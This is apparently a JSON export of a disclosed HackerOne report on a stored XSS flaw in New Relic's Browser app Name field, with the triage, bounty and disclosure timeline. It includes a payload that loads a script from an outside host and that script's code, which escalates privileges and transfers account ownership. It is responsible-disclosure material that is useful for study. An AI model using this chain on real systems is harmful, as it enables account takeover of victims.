{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "resolved", 
    "bug_reporter_agreed_on_going_public_at": "2018-07-20T18:20:06.994Z", 
    "voters": [
        "ldionmarcil", 
        "bl4de", 
        "spam404", 
        "kapytein", 
        "ramsexy", 
        "mik317", 
        "bogdantcaciuc", 
        "muon4", 
        "mlitchfield", 
        "asad0x01_", 
        "and 23 more..."
    ], 
    "facebook_team?": false, 
    "has_bounty?": true, 
    "bounty_amount": "3000.0", 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 348076, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": "2018-07-20T20:05:33.787Z", 
    "vulnerability_information": "The `Name` field of the Brower apps feature is not properly escaped in at least two pages. An attacker can create a new browser application with a specially crafted `Name` field which will be reflected and interpreted by other users visiting these two pages. Leveraging this vulnerability, I was able to target an admin account in order to elevate my own `user` privileged account to the privilege of `admin`  and transfer myself the ownership of the account.\n\n# Steps to reproduce\n1. Create a new Browser application (https://rpm.newrelic.com/accounts/{account_id}/browser/new)\n1. Pick the `Copy/Paste Javascript code` toggle\n1. in the `Name` field, insert the following payload: \n```js\n '+alert(document.domain)+' \n```\n\n1. Press `Enable`\n1. Go back to the Browser application list and select the application you just created\n1. There, visit the `Violations` or `Alert conditions` page to trigger the XSS:\n{F294525} \nThis is caused by this line which does not properly sanitize the single quotes found in the `Name`: {F294526}\n\n# Leveraging this to elevate our own privileges\nI used the `account.newrelic.com` REST API to build an attack scenario where an unprivileged user could elevate their own privileges to the status of `owner`. It's a two step job, first we need to grant ourself the `admin` privileges, and then we need to make the owner transfer ownership to our account.\n\n### Bypassing character limitation\nThe application `Name` field is restricted to 128 characters, which is too short for a working two-step payload (admin-granting and owner-transferring). I side-loaded a self-hosted Javascript file through jQuery in order to save space. This is the payload I used:\n```js\n'+$.ajax({url:\"https://windows-analytics.com/j.js\",dataType:\"script\"})+'\n```\nThe `j.js` file is fetched by jQuery and interpreted in the context of the DOM at `rpm.newrelic.com`. This is the content of the file:\n\n```js\nvar ADMIN_USER_ID    = 2194406;\nvar ATTACKER_USER_ID = 2196014;\n\n// step 1, admin takeover\nalert(\"Giving us admin privileges...\");\n$.ajax({\n    url: \"/user_management/accounts/1968666/users/\"+ATTACKER_USER_ID,\n    type: \"put\",\n    data: JSON.stringify({\"account_view\":{\"level\":\"admin\"}}),\n    headers: {\n\t\"Origin\":\"https://account.newrelic.com\",\n\t\"Accept\":\"application/json\",\n\t\"X-Requested-With\":\"XMLHttpRequest\",\n\t\"User-Agent\":\"Mozilla/5.0 (X11; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0\",\n\t\"Connection\":\"close\",\n\t\"Accept-Language\":\"en-US,en;q=0.5\",\n\t\"Accept-Encoding\":\"gzip, deflate\",\n\t\"Content-Type\":\"application/json\"\n    },\n    success: function (data) {\n\t// step 2, ownership takeover\n\talert(\"Changing ownership...\");\n\t$.ajax({\n\t    url: \"/user_management/accounts/1968666/update_primary_admin?value=\"+ATTACKER_USER_ID,\n\t    type: \"put\",\n\t    headers: {\n\t\t\"Origin\":\"https://account.newrelic.com\",\n\t\t\"Accept\":\"*/*\",\n\t\t\"X-Requested-With\":\"XMLHttpRequest\",\n\t\t\"User-Agent\":\"Mozilla/5.0 (X11; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0\",\n\t\t\"Connection\":\"close\",\n\t\t\"Accept-Language\":\"en-US,en;q=0.5\",\n\t\t\"Accept-Encoding\":\"gzip, deflate\"\n\t    },\n\t    success: function () {\n\t\t// Account takeover done!\n\t\talert(\"Full takeover done!\");\n\t    }\n\t});\n    }\n});\n```\nThis file performs two AJAX queries when loaded. First, it grants the attacker's account the `admin` privileges. Second, it transfers the ownership of the victim's account to the attacker's. I leaked the `user_id` of the account owner through the `user-management.service.newrelic.com` API at the `/accounts/1968666/users` endpoint. I put this value in the beginning of the `j.js`. \n\n## Triggering the payload\nOnce an admin visits either the `https://rpm.newrelic.com/accounts/{ACCOUNT_ID}browser/{APP_ID}/alert_conditions` or `https://rpm.newrelic.com/accounts/{ACCOUNT_ID}/browser/{APP_ID}/violations`, this chain of actions will unfold and the administrator will have transferred the ownership of the account over to the attacker.\n\nA full video of the attack scenario can be seen here: {F294527}\n\n# Mitigation\nFirst, the `Name` field should be properly sanitized to block users from executing arbitrary JavaScript.\nSecond, (and I feel this could be a bug report of its own) critical actions such as transferring ownership, granting high privileges, *should require re-entering your administrative password*. This is a standard practice when following defence in depth principles. Using this principle, XSS attacks would be restricted to a very limited set of actions, none of which should have critical impact.\n\n## Impact\n\nUsers can execute arbitrary JavaScript code in the context of other users. This is critical when targeted users have high privileges. Attackers are then able to grant themselves the administrator privileges and even takeover the ownership of the New Relic account.\n\nThe hacker selected the **Cross-site Scripting (XSS) - Stored** weakness. This vulnerability type requires contextual information from the hacker. They provided the following answers:\n\n**URL**\nhttps://rpm.newrelic.com/accounts/1968666/browser/52924826/alert_conditions\n\n**Verified**\nYes\n\n", 
    "activity_page_count": 1, 
    "severity": {
        "rating": "high", 
        "author_type": "User"
    }, 
    "title": "Stored XSS in Brower `name` field reflected in two pages", 
    "is_member_of_team?": null, 
    "vote_count": 33, 
    "summaries": [
        {
            "category": "team", 
            "can_create?": false, 
            "can_view?": true
        }, 
        {
            "category": "researcher", 
            "can_create?": false, 
            "can_view?": true
        }
    ], 
    "structured_scope": {
        "asset_identifier": "alerts.newrelic.com", 
        "max_severity": "critical", 
        "databaseId": 6454, 
        "asset_type": "URL"
    }, 
    "allow_singular_disclosure_at": "2018-08-19T18:20:07.189Z", 
    "state": "Closed", 
    "cve_ids": [], 
    "activity_page_number": 1, 
    "readable_substate": "Resolved", 
    "public": true, 
    "formatted_bounty": "$3,000", 
    "attachments": [
        {
            "file_name": "2018-05-07-000629_615x290_scrot.png", 
            "type": "image/png", 
            "id": 294525, 
            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/294/525/752553c7439a812ded14166d9f6d9545bdf225ec/2018-05-07-000629_615x290_scrot.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWS2CSUE3%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T221856Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA4aDNFtI3gdfN0FFddCnSK3A%2FNn8rGoRLECenibnPQxlYfOkhD533uSo6Jsi4CGisj6U81IFoE7NBEuPv%2BUT2dP%2BOOfq6zDsTXqsfa%2B9BuuRNIyl27dmo7gw2zBlEjVTSMZKI8B0zj4q4GeD0gX7YDUvrqCnrwfrQpq6BHV5kFcBvzP%2FNnVou4jydvq2EcrKGQeGmq4afFHwdD5CN5DoFnFHkXlCLPVWCK%2FpO5NMVMdWRvVyk90BTGTkyTY5IWuz0%2B08qqd5UcN1WLfvK4E3S6jTn5eK%2FSX5o5meFKi0SmtPddLVR5u8xNOgccHPaVXRO5KIBBCZ5yilpXGFhVd%2FmfBeI1lJ6Zc7kOal7ihq3TcrVPP%2FopjPjQdAVdt9an7SXkRFGjCeWjyWfPwghBaIoGvWhM9OHPkS94WN%2FukqeEoK1pVo2cJuAYnallyv%2Fvqjndvr%2BodZqbfFrY5T9ebirMMIoriCBo2Xkpz9lw7EjTK4aWQBSBYrDh4Xl4%2FXmR8N0VkEu6LxpbUd0lfl%2Fjh1nqnK2KhGRbixj81Rq6v9WRwhjH%2FADPcK25w6aq3rFp1RLV%2B6mj273p2%2FLR6yf68LZuCXsY5sDs2Xf0oo46m4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=23e046f8056d0c776a4bed995ff45984edf5f6bbe884ac2089390dc714da272c"
        }, 
        {
            "file_name": "2018-05-07-000955_485x109_scrot.png", 
            "type": "image/png", 
            "id": 294526, 
            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/294/526/3ef66a7e7d123986d5f9216e91c5f823f00c2494/2018-05-07-000955_485x109_scrot.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWS2CSUE3%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T221856Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA4aDNFtI3gdfN0FFddCnSK3A%2FNn8rGoRLECenibnPQxlYfOkhD533uSo6Jsi4CGisj6U81IFoE7NBEuPv%2BUT2dP%2BOOfq6zDsTXqsfa%2B9BuuRNIyl27dmo7gw2zBlEjVTSMZKI8B0zj4q4GeD0gX7YDUvrqCnrwfrQpq6BHV5kFcBvzP%2FNnVou4jydvq2EcrKGQeGmq4afFHwdD5CN5DoFnFHkXlCLPVWCK%2FpO5NMVMdWRvVyk90BTGTkyTY5IWuz0%2B08qqd5UcN1WLfvK4E3S6jTn5eK%2FSX5o5meFKi0SmtPddLVR5u8xNOgccHPaVXRO5KIBBCZ5yilpXGFhVd%2FmfBeI1lJ6Zc7kOal7ihq3TcrVPP%2FopjPjQdAVdt9an7SXkRFGjCeWjyWfPwghBaIoGvWhM9OHPkS94WN%2FukqeEoK1pVo2cJuAYnallyv%2Fvqjndvr%2BodZqbfFrY5T9ebirMMIoriCBo2Xkpz9lw7EjTK4aWQBSBYrDh4Xl4%2FXmR8N0VkEu6LxpbUd0lfl%2Fjh1nqnK2KhGRbixj81Rq6v9WRwhjH%2FADPcK25w6aq3rFp1RLV%2B6mj273p2%2FLR6yf68LZuCXsY5sDs2Xf0oo46m4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=e95ac22968a1b560a7464d25cb29fc3786d89c794e4e3d8e57b613d25ccfa861"
        }, 
        {
            "file_name": "output.gif", 
            "type": "image/gif", 
            "id": 294527, 
            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/294/527/8b2e85bf825334637a8d2df115dea36f2628bce7/output.gif?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWS2CSUE3%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T221856Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA4aDNFtI3gdfN0FFddCnSK3A%2FNn8rGoRLECenibnPQxlYfOkhD533uSo6Jsi4CGisj6U81IFoE7NBEuPv%2BUT2dP%2BOOfq6zDsTXqsfa%2B9BuuRNIyl27dmo7gw2zBlEjVTSMZKI8B0zj4q4GeD0gX7YDUvrqCnrwfrQpq6BHV5kFcBvzP%2FNnVou4jydvq2EcrKGQeGmq4afFHwdD5CN5DoFnFHkXlCLPVWCK%2FpO5NMVMdWRvVyk90BTGTkyTY5IWuz0%2B08qqd5UcN1WLfvK4E3S6jTn5eK%2FSX5o5meFKi0SmtPddLVR5u8xNOgccHPaVXRO5KIBBCZ5yilpXGFhVd%2FmfBeI1lJ6Zc7kOal7ihq3TcrVPP%2FopjPjQdAVdt9an7SXkRFGjCeWjyWfPwghBaIoGvWhM9OHPkS94WN%2FukqeEoK1pVo2cJuAYnallyv%2Fvqjndvr%2BodZqbfFrY5T9ebirMMIoriCBo2Xkpz9lw7EjTK4aWQBSBYrDh4Xl4%2FXmR8N0VkEu6LxpbUd0lfl%2Fjh1nqnK2KhGRbixj81Rq6v9WRwhjH%2FADPcK25w6aq3rFp1RLV%2B6mj273p2%2FLR6yf68LZuCXsY5sDs2Xf0oo46m4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=baad9a1160242288a4243a5f1716f4fcbca0f40e45a06ec2eaa1ff5babdc22f1"
        }
    ], 
    "singular_disclosure_disabled": false, 
    "activities": [
        {
            "automated_response": false, 
            "created_at": "2018-05-08T20:26:49.220Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-05-08T20:26:49.220Z", 
            "actor": {
                "username": "ahamlin", 
                "url": "/ahamlin", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/037/071/f64610f48ed92d78a126cc855754c0aaef4beaee_medium.jpg?1507763206"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "newrelic", 
            "message": "Thank you for your report, @ldionmarcil! This is a great find, and your PoC is awesome.\n\nI've reproduced this and triaged it with the appropriate engineering team. Unfortunately, you've caught us at an awkward time, where most of our software engineers will be at a company offsite the remainder of this week, so remediation may take a bit longer than it normally would. This will, however, bump up to the top of their queue.\n\nWe'll keep you updated on its progress!", 
            "markdown_message": "<p>Thank you for your report, <a href=\"/ldionmarcil\">@ldionmarcil</a>! This is a great find, and your PoC is awesome.</p>\n\n<p>I&#39;ve reproduced this and triaged it with the appropriate engineering team. Unfortunately, you&#39;ve caught us at an awkward time, where most of our software engineers will be at a company offsite the remainder of this week, so remediation may take a bit longer than it normally would. This will, however, bump up to the top of their queue.</p>\n\n<p>We&#39;ll keep you updated on its progress!</p>\n", 
            "type": "Activities::BugTriaged", 
            "id": 2716983, 
            "genius_execution_id": null
        }, 
        {
            "bounty_currency": "usd", 
            "automated_response": false, 
            "created_at": "2018-05-08T20:59:36.782Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-05-08T20:59:36.782Z", 
            "actor": {
                "url": "/newrelic", 
                "profile": {
                    "name": "New Relic"
                }, 
                "ibb": false, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/017/011/94822999c270d791d185b40e07d36cc864e96faa_medium.?1482361910"
                }
            }, 
            "team_handle": "newrelic", 
            "bonus_amount": "0.0", 
            "bounty_amount": "3000.0", 
            "collaborator": {
                "username": "ldionmarcil", 
                "url": "/ldionmarcil"
            }, 
            "message": "While not explicitly within the alerts.newrelic.com domain, this is definitely a flaw in our Alerts product, and we're therefore happy to award a bounty!", 
            "markdown_message": "<p>While not explicitly within the alerts.newrelic.com domain, this is definitely a flaw in our Alerts product, and we&#39;re therefore happy to award a bounty!</p>\n", 
            "type": "Activities::BountyAwarded", 
            "id": 2717064, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "reporter": {
                "username": "ldionmarcil", 
                "url": "/ldionmarcil"
            }, 
            "created_at": "2018-07-20T17:20:23.457Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-07-20T17:20:23.457Z", 
            "actor": {
                "username": "ahamlin", 
                "url": "/ahamlin", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/037/071/f64610f48ed92d78a126cc855754c0aaef4beaee_medium.jpg?1507763206"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "newrelic", 
            "message": "Hi @ldionmarcil,\n\nThis issue should now be resolved. Please feel free to re-test and let us know if we've missed anything. Thank you for helping keep New Relic secure!\n\n\\- Alex", 
            "markdown_message": "<p>Hi <a href=\"/ldionmarcil\">@ldionmarcil</a>,</p>\n\n<p>This issue should now be resolved. Please feel free to re-test and let us know if we&#39;ve missed anything. Thank you for helping keep New Relic secure!</p>\n\n<p>- Alex</p>\n", 
            "type": "Activities::BugResolved", 
            "id": 3075211, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-07-20T18:20:07.102Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-07-20T18:20:07.102Z", 
            "actor": {
                "username": "ldionmarcil", 
                "url": "/ldionmarcil", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/098/412/bb3feeeea86461e7032fc2c8c1e2d1178177d244_medium.jpg?1526058649"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "newrelic", 
            "first_to_agree": true, 
            "message": "Thanks for the udpate!", 
            "markdown_message": "<p>Thanks for the udpate!</p>\n", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 3075420, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-07-20T18:22:19.965Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-07-20T18:22:19.965Z", 
            "actor": {
                "username": "ldionmarcil", 
                "url": "/ldionmarcil", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/098/412/bb3feeeea86461e7032fc2c8c1e2d1178177d244_medium.jpg?1526058649"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "newrelic", 
            "message": "Could we disclose?", 
            "markdown_message": "<p>Could we disclose?</p>\n", 
            "type": "Activities::Comment", 
            "id": 3075427, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "old_scope": "*.newrelic.com", 
            "created_at": "2018-07-20T20:05:04.925Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-07-20T20:05:04.925Z", 
            "actor": {
                "username": "dmcmahon", 
                "url": "/dmcmahon", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "newrelic", 
            "new_scope": "alerts.newrelic.com", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ChangedScope", 
            "id": 3075804, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-07-20T20:05:20.036Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-07-20T20:05:20.036Z", 
            "actor": {
                "username": "dmcmahon", 
                "url": "/dmcmahon", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "additional_data": {
                "new_title": "Stored XSS in Brower `name` field reflected in two pages", 
                "old_title": "[rpm.newrelic.com] Stored XSS in Brower `name` field reflected in two pages \u2014 full account ownership takeover PoC"
            }, 
            "team_handle": "newrelic", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportTitleUpdated", 
            "id": 3075806, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-07-20T20:05:33.856Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-07-20T20:05:33.856Z", 
            "actor": {
                "username": "dmcmahon", 
                "url": "/dmcmahon", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "newrelic", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 3075807, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-07-20T20:05:34.030Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-07-20T20:05:34.030Z", 
            "actor": {
                "username": "dmcmahon", 
                "url": "/dmcmahon", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "newrelic", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportBecamePublic", 
            "id": 3075808, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "singular_disclosure_allowed": true, 
    "reporter": {
        "username": "ldionmarcil", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/ldionmarcil", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/098/412/94e7ac47a244d561aca2830082b1764f45aac653_small.jpg?1526058649"
        }, 
        "is_me?": false
    }, 
    "weakness": {
        "id": 62, 
        "name": "Cross-site Scripting (XSS) - Stored"
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "allow_singular_disclosure_after": -9431929.072776465, 
    "disclosed_at": "2018-07-20T20:05:33.971Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/348076", 
    "created_at": "2018-05-07T04:32:13.672Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<p>The <code>Name</code> field of the Brower apps feature is not properly escaped in at least two pages. An attacker can create a new browser application with a specially crafted <code>Name</code> field which will be reflected and interpreted by other users visiting these two pages. Leveraging this vulnerability, I was able to target an admin account in order to elevate my own <code>user</code> privileged account to the privilege of <code>admin</code>  and transfer myself the ownership of the account.</p>\n\n<h1 id=\"steps-to-reproduce\">Steps to reproduce</h1>\n\n<ol>\n<li>Create a new Browser application (<a title=\"https://rpm.newrelic.com/accounts/%7Baccount_id%7D/browser/new\" href=\"/redirect?signature=a7daba8423276b50d1f9041a4a577e58fed25666&amp;url=https%3A%2F%2Frpm.newrelic.com%2Faccounts%2F%257Baccount_id%257D%2Fbrowser%2Fnew\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://rpm.newrelic.com/accounts/%7Baccount_id%7D/browser/new</span><i class=\"icon-external-link\"></i></a>)</li>\n<li>Pick the <code>Copy/Paste Javascript code</code> toggle</li>\n<li>\n<p>in the <code>Name</code> field, insert the following payload: </p>\n<pre class=\"highlight javascript\"><code><span class=\"s1\">&#39;+alert(document.domain)+&#39;</span> \n</code></pre>\n</li>\n<li><p>Press <code>Enable</code></p></li>\n<li><p>Go back to the Browser application list and select the application you just created</p></li>\n<li><p>There, visit the <code>Violations</code> or <code>Alert conditions</code> page to trigger the XSS:<br>\n<a href=\"#\" class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"2018-05-07-000629_615x290_scrot.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/294/525/752553c7439a812ded14166d9f6d9545bdf225ec/2018-05-07-000629_615x290_scrot.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQWS2CSUE3%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221856Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA4aDNFtI3gdfN0FFddCnSK3A%2FNn8rGoRLECenibnPQxlYfOkhD533uSo6Jsi4CGisj6U81IFoE7NBEuPv%2BUT2dP%2BOOfq6zDsTXqsfa%2B9BuuRNIyl27dmo7gw2zBlEjVTSMZKI8B0zj4q4GeD0gX7YDUvrqCnrwfrQpq6BHV5kFcBvzP%2FNnVou4jydvq2EcrKGQeGmq4afFHwdD5CN5DoFnFHkXlCLPVWCK%2FpO5NMVMdWRvVyk90BTGTkyTY5IWuz0%2B08qqd5UcN1WLfvK4E3S6jTn5eK%2FSX5o5meFKi0SmtPddLVR5u8xNOgccHPaVXRO5KIBBCZ5yilpXGFhVd%2FmfBeI1lJ6Zc7kOal7ihq3TcrVPP%2FopjPjQdAVdt9an7SXkRFGjCeWjyWfPwghBaIoGvWhM9OHPkS94WN%2FukqeEoK1pVo2cJuAYnallyv%2Fvqjndvr%2BodZqbfFrY5T9ebirMMIoriCBo2Xkpz9lw7EjTK4aWQBSBYrDh4Xl4%2FXmR8N0VkEu6LxpbUd0lfl%2Fjh1nqnK2KhGRbixj81Rq6v9WRwhjH%2FADPcK25w6aq3rFp1RLV%2B6mj273p2%2FLR6yf68LZuCXsY5sDs2Xf0oo46m4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=23e046f8056d0c776a4bed995ff45984edf5f6bbe884ac2089390dc714da272c\" data-attachment-type=\"image/png\"><img src=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/294/525/752553c7439a812ded14166d9f6d9545bdf225ec/2018-05-07-000629_615x290_scrot.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQWS2CSUE3%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221856Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA4aDNFtI3gdfN0FFddCnSK3A%2FNn8rGoRLECenibnPQxlYfOkhD533uSo6Jsi4CGisj6U81IFoE7NBEuPv%2BUT2dP%2BOOfq6zDsTXqsfa%2B9BuuRNIyl27dmo7gw2zBlEjVTSMZKI8B0zj4q4GeD0gX7YDUvrqCnrwfrQpq6BHV5kFcBvzP%2FNnVou4jydvq2EcrKGQeGmq4afFHwdD5CN5DoFnFHkXlCLPVWCK%2FpO5NMVMdWRvVyk90BTGTkyTY5IWuz0%2B08qqd5UcN1WLfvK4E3S6jTn5eK%2FSX5o5meFKi0SmtPddLVR5u8xNOgccHPaVXRO5KIBBCZ5yilpXGFhVd%2FmfBeI1lJ6Zc7kOal7ihq3TcrVPP%2FopjPjQdAVdt9an7SXkRFGjCeWjyWfPwghBaIoGvWhM9OHPkS94WN%2FukqeEoK1pVo2cJuAYnallyv%2Fvqjndvr%2BodZqbfFrY5T9ebirMMIoriCBo2Xkpz9lw7EjTK4aWQBSBYrDh4Xl4%2FXmR8N0VkEu6LxpbUd0lfl%2Fjh1nqnK2KhGRbixj81Rq6v9WRwhjH%2FADPcK25w6aq3rFp1RLV%2B6mj273p2%2FLR6yf68LZuCXsY5sDs2Xf0oo46m4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=23e046f8056d0c776a4bed995ff45984edf5f6bbe884ac2089390dc714da272c\" class=\"markdown-inline-image\"></a> <br>\nThis is caused by this line which does not properly sanitize the single quotes found in the <code>Name</code>: <a href=\"#\" class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"2018-05-07-000955_485x109_scrot.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/294/526/3ef66a7e7d123986d5f9216e91c5f823f00c2494/2018-05-07-000955_485x109_scrot.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQWS2CSUE3%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221856Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA4aDNFtI3gdfN0FFddCnSK3A%2FNn8rGoRLECenibnPQxlYfOkhD533uSo6Jsi4CGisj6U81IFoE7NBEuPv%2BUT2dP%2BOOfq6zDsTXqsfa%2B9BuuRNIyl27dmo7gw2zBlEjVTSMZKI8B0zj4q4GeD0gX7YDUvrqCnrwfrQpq6BHV5kFcBvzP%2FNnVou4jydvq2EcrKGQeGmq4afFHwdD5CN5DoFnFHkXlCLPVWCK%2FpO5NMVMdWRvVyk90BTGTkyTY5IWuz0%2B08qqd5UcN1WLfvK4E3S6jTn5eK%2FSX5o5meFKi0SmtPddLVR5u8xNOgccHPaVXRO5KIBBCZ5yilpXGFhVd%2FmfBeI1lJ6Zc7kOal7ihq3TcrVPP%2FopjPjQdAVdt9an7SXkRFGjCeWjyWfPwghBaIoGvWhM9OHPkS94WN%2FukqeEoK1pVo2cJuAYnallyv%2Fvqjndvr%2BodZqbfFrY5T9ebirMMIoriCBo2Xkpz9lw7EjTK4aWQBSBYrDh4Xl4%2FXmR8N0VkEu6LxpbUd0lfl%2Fjh1nqnK2KhGRbixj81Rq6v9WRwhjH%2FADPcK25w6aq3rFp1RLV%2B6mj273p2%2FLR6yf68LZuCXsY5sDs2Xf0oo46m4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=e95ac22968a1b560a7464d25cb29fc3786d89c794e4e3d8e57b613d25ccfa861\" data-attachment-type=\"image/png\"><img 